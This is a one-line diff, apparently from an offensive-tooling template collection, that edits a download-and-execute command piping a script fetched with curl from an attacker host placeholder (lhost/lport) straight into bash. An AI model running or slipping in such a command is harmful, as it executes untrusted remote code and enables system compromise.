@@ -1,1 +1,1 @@
-bash <(curl -s http://<lhost>:<lport><path>.sh)
+bash <(curl -s http://<lhost>:<lport>/<file=script.sh>)
